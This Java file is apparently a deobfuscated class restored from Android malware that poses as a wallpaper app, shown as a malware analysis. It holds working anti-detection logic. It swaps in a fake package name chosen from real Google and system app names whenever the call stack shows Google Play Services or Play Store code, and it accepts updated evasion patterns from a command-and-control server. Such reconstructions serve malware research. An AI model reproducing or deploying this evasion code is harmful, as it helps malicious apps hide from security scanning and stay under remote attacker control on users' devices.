package hook;

import android.content.Context;
import android.text.TextUtils;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import org.json.JSONArray;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: IlIllll1/llllIIIIll1
 *
 * Static configuration holder for the package name hook system. Manages:
 *   - The real and fake package names
 *   - Stack trace patterns used to detect security tools
 *   - Initialization from a pool of 13 candidate fake package names
 *   - Dynamic pattern updates from the C&C server
 *
 * At init time, a fake package name is randomly selected from a list of
 * legitimate-looking system/Google app package names. During runtime,
 * stack frames are matched against pattern lists to detect when security
 * tools are calling getPackageName() or getPackageManager().
 *
 * The C&C server can dynamically update detection patterns via DllpgdConfig,
 * allowing the malware to adapt to new security tool versions.
 *
 * Original obfuscated name: IlIllll1.llllIIIIll1
 */
public class HookConfig {

    /**
     * Default PackageManager hook detection patterns (compiled-in, XOR-encrypted
     * in the original binary). These match class/method names of known security
     * tools like Google Play Protect.
     */
    public static final List<String> DEFAULT_PM_PATTERNS;

    /** Current getPackageName() detection patterns (can be updated by C&C) */
    public static List<String> pkgNamePatterns;

    /** Current getPackageManager() detection patterns (can be updated by C&C) */
    public static List<String> pmPatterns;

    /** Real package name: "com.android.wallpaper" */
    public static String realPackageName;

    /** Whether init() has been called */
    public static boolean initialized;

    /** Fake package name (randomly selected from candidates at init time) */
    public static String fakePackageName;

    /** Whether the hook feature is enabled */
    public static boolean hookEnabled;

    static {
        // Default detection patterns (XOR-encrypted in original binary)
        // After decryption, these match Google Play Services / Play Protect class names
        DEFAULT_PM_PATTERNS = Arrays.asList(
            "com.google.android.gms",      // Google Play Services
            "com.android.vending"           // Google Play Store
        );
        pkgNamePatterns = new ArrayList<>();
        pmPatterns = new ArrayList<>();
    }

    // =========================================================================
    // Initialization
    // =========================================================================

    /**
     * Initializes the hook config: saves the real package name and randomly
     * selects a fake package name from 13 hardcoded candidates.
     *
     * The candidates are all legitimate system/Google app package names,
     * chosen to be inconspicuous if a security tool logs or displays them.
     *
     * Original: llllIIIIll1(Context)
     */
    public static final void init(Context context) {
        // Start with default patterns
        pkgNamePatterns = DEFAULT_PM_PATTERNS;
        pmPatterns = DEFAULT_PM_PATTERNS;

        // Save the real package name
        realPackageName = context.getPackageName();  // "com.android.wallpaper"

        // 13 candidate fake package names (XOR-encrypted in original binary)
        // These are all real system/Google app package names that would look
        // normal in any security scan
        List<String> candidates = Arrays.asList(
            "com.google.android.gms",
            "com.google.android.apps.photos",
            "com.google.android.apps.maps",
            "com.samsung.android.launcher",
            "com.android.chrome",
            "com.android.providers.settings",
            "com.google.android.youtube",
            "com.google.android.apps.docs",
            "com.android.settings",
            "com.google.android.inputmethod.latin",
            "com.android.systemui",
            "com.google.android.calendar",
            "com.google.android.deskclock"
        );

        // Randomly select one fake name for this session
        fakePackageName = candidates.get(new Random().nextInt(candidates.size()));

        initialized = true;
    }

    // =========================================================================
    // Stack frame matching
    // =========================================================================

    /**
     * Checks if a stack frame matches any getPackageName() detection pattern.
     * Used by HookContextWrapper.getPackageName() to decide whether to return
     * the fake package name.
     *
     * @param frame the stack trace element to check
     * @return true if the frame matches a known security tool pattern
     */
    public static boolean matchesPkgNamePattern(StackTraceElement frame) {
        if (frame == null || pkgNamePatterns.size() <= 0) {
            return false;
        }
        for (String pattern : pkgNamePatterns) {
            if (frame.toString().contains(pattern)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Checks if a stack frame matches any getPackageManager() detection pattern.
     * Used by HookContextWrapper.getPackageManager() to decide whether to return
     * the PackageManagerProxy.
     *
     * @param frame the stack trace element to check
     * @return true if the frame matches a known security tool pattern
     */
    public static boolean matchesPMPattern(StackTraceElement frame) {
        if (frame == null || pmPatterns.size() <= 0) {
            return false;
        }
        for (String pattern : pmPatterns) {
            if (frame.toString().contains(pattern)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Validates that the hook is properly configured and ready to operate.
     * Returns true only if initialized, both names are set, and they differ.
     *
     * Original: isHookActive()
     */
    public static boolean isHookActive() {
        return initialized
            && !TextUtils.isEmpty(realPackageName)
            && !TextUtils.isEmpty(fakePackageName)
            && !realPackageName.equals(fakePackageName);
    }

    // =========================================================================
    // Dynamic C&C updates
    // =========================================================================

    /**
     * Updates detection patterns from C&C server configuration.
     * Called when a new DllpgdConfig is received with updated
     * hookPkgNameStackTraces / hookPackageManagerStackTraces fields.
     *
     * @param pkgNameTraces  new package name detection patterns (from C&C JSON)
     * @param pmTraces       new PackageManager detection patterns (from C&C)
     */
    public static void updatePatterns(JSONArray pkgNameTraces, List<String> pmTraces) {
        if (pkgNameTraces != null && pkgNameTraces.length() > 0) {
            List<String> newPatterns = new ArrayList<>();
            for (int i = 0; i < pkgNameTraces.length(); i++) {
                try {
                    newPatterns.add(pkgNameTraces.getString(i));
                } catch (Exception ignored) {
                }
            }
            if (!newPatterns.isEmpty()) {
                pkgNamePatterns = newPatterns;
            }
        }
        if (pmTraces != null && !pmTraces.isEmpty()) {
            pmPatterns = pmTraces;
        }
    }
}
